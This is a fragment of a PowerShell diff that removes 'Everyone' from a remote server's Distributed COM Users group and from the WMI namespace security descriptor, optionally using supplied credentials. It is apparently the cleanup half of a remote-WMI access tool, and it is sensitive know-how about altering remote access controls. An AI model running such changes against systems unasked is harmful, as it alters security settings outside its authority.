+        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName; Credential=$Credential}
+        $Group.PsBase.Username = $Credential.Username
+        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password
+    }
+    else {
+        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName}
+    }
+
+    # remove 'Everyone' from the 'Distributed COM Users' local group on the remote server
+    $Group.Remove("WinNT://everyone,user")
+
+    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor
+
+    # remove the 'Everyone' ('S-1-1-0') DACL
+    $WmiObjectAcl.DACL = $WmiObjectAcl.DACL | Where-Object {$_.Trustee.SidString -ne 'S-1-1-0'} | ForEach-Object { $_.psobject.immediateBaseObject }
+
+    $Params += @{Name="SetSecurityDescriptor"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}
+    $Output = Invoke-WmiMethod @Params
+    if ($Output.ReturnValue -ne 0) {
+        throw "SetSecurityDescriptor failed: $($Output.ReturnValue)"
     }
 }
